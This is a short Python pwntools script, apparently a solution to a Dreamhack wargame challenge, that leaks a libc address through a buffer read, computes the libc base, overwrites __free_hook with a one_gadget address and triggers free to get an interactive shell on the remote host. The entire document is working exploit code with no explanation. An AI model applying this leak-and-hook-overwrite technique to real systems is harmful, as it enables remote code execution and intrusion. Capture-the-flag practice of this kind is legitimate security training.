from pwn import *

r = remote("host8.dreamhack.games", 16988)

r.sendafter("Buf: ", b"a"*0x48)

leak = u64(r.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc_base = leak - 0x021bf7
free_hook = libc_base + 0x3ed8e8
one_gadget = libc_base + 0x4f432

r.sendlineafter("write: ", str(free_hook))
r.sendlineafter("With: ", str(one_gadget))

r.sendlineafter("free: ", "0")

r.interactive()